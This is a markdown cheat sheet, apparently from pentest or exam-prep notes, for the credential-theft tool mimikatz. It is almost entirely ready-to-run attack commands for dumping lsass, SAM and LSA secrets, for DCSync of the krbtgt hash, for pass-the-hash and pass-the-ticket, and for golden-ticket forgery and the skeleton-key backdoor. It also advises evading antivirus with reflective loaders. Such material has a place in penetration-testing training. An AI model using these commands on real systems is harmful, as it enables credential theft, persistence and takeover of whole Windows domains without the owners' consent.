# mimikatz — the credential swiss-army knife

> **The tool for extracting Windows creds.** Dumps plaintext passwords, hashes, Kerberos tickets, DPAPI secrets from lsass memory.

**Launch (on target, admin shell):** `mimikatz.exe`

---

## 🎯 Cheat-flow

```text
mimikatz # privilege::debug            → enable SeDebugPrivilege (REQUIRED)
mimikatz # sekurlsa::logonpasswords    → dump plain/NTLM/Kerberos creds
mimikatz # lsadump::sam                → dump local SAM (needs SYSTEM)
mimikatz # lsadump::secrets            → LSA secrets
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local
mimikatz # kerberos::list /export      → export .kirbi tickets
mimikatz # sekurlsa::pth /user:... /domain:... /ntlm:... /run:cmd.exe
```

---

## 🔑 Key modules

| Command | Purpose |
|---|---|
| `privilege::debug` | **Must run first** — elevates to SeDebug |
| `token::elevate` | Elevate to SYSTEM |
| `sekurlsa::logonpasswords` | **The big one** — plaintext + NTLM + Kerberos from lsass |
| `sekurlsa::pth` | Pass-the-hash — spawn process as user with their NT hash |
| `sekurlsa::tickets /export` | Export all Kerberos tickets to .kirbi |
| `sekurlsa::ekeys` | AES128/256 Kerberos keys |
| `lsadump::sam` | Local SAM hashes (needs SYSTEM) |
| `lsadump::secrets` | LSA secrets (service creds, autologon) |
| `lsadump::cache` | MSCache v2 domain-cached creds |
| `lsadump::dcsync /user:krbtgt` | **DCSync** — pull krbtgt hash from DC via replication |
| `kerberos::list /export` | List + export current tickets |
| `kerberos::ptt ticket.kirbi` | Pass-the-ticket (inject) |
| `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt` | Forge golden ticket |
| `kerberos::silver /...` | Forge silver ticket (service account) |
| `dpapi::masterkey` / `dpapi::cred` | Decrypt DPAPI blobs |
| `vault::cred` / `vault::list` | Windows Vault |
| `crypto::certificates /export` | Export certs + private keys |
| `misc::skeleton` | Skeleton key backdoor on DC |

---

## 📋 Recipes

```text
# 1. The classic dump
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# 2. Pass-the-hash into cmd.exe
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP /ntlm:aad3b435... /run:cmd.exe

# 3. DCSync krbtgt (need DA or Replicating Changes privs)
mimikatz # lsadump::dcsync /user:CORP\krbtgt

# 4. Forge a Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
           /sid:S-1-5-21-1111-2222-3333 /krbtgt:<nt hash> /id:500 /ptt

# 5. Dump SAM offline from hive files
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# 6. Export kerberos tickets
mimikatz # sekurlsa::tickets /export
```

---

## 🐧 Running from Linux (pypykatz)

Mimikatz is Windows-native, but you can parse an lsass dump offline:
```bash
pypykatz lsa minidump lsass.dmp
```
Create the dump on target with `procdump -ma lsass.dmp` or Task Manager → Create Dump File (as admin).

---

## ⚠️ Gotchas

- **AV will detonate on sight.** Signed mimikatz.exe is flagged by every modern EDR. Use inline loaders, reflection, or run from memory. On a lab/exam target, Defender will eat it — disable or use a reflective loader.
- `sekurlsa::logonpasswords` requires **admin + SeDebug**. Without `privilege::debug` you'll get 0x00000005.
- Newer Windows (1607+) with **Credential Guard** enabled → plaintext passwords not in lsass. You still get NTLM hashes.
- Domain admin needed for DCSync, *or* a user with "Replicating Directory Changes" rights.
- Run `log file.txt` first to tee output.

---

## 🔗 Related

- [impacket](impacket.md) · [crackmapexec](crackmapexec.md) · [evil-winrm](evil-winrm.md) · [responder](responder.md) · [hashcat](hashcat.md)
